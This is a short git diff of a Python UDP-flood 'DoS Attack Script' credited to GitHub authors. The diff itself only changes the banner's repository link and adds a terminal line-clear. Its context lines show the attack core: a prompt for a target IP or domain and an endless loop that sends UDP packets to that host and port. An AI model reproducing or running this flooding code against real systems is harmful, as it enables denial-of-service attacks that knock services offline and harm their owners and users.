@@ -12,7 +12,7 @@ _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 print("DoS Attack Script")
 print("Original Author   : HA-MRX @ https://github.com/Ha3MrX")
 print("Remaker           : Fimall @ https://github.com/ItsFimall")
-print("Repo              : https://github.com/ItsFimall/DoS-Attack")
+print("Repo              : https://github.com/ItsFimall/DoS")
 
 
 target = input("Target (IP or domain): ")
@@ -50,6 +50,7 @@ while True:
         _socket.sendto(bytes, (ip, port))  # Socket send packets
         sent = sent + 1
         print(f"Sent {sent} -> {ip}:{port}")
+        sys.stdout.write("\033[K")
     except KeyboardInterrupt:
         print("User interrupted the attack.")
         sys.exit()
